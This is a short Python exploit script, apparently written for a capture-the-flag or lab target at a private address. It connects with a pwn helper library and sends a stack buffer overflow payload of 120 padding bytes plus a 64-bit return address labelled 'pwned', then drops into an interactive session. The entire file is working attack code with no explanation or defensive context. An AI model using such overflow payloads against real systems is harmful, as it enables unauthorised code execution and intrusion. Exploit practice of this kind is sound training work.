from hardtobelieve import *

s = HarDToSock(host="192.168.37.130", port=1928)
pwned = 0x40064d
payload = "a"*120 + p64(pwned)
s.sendln(payload)
s.recv()
s.hardtopwn()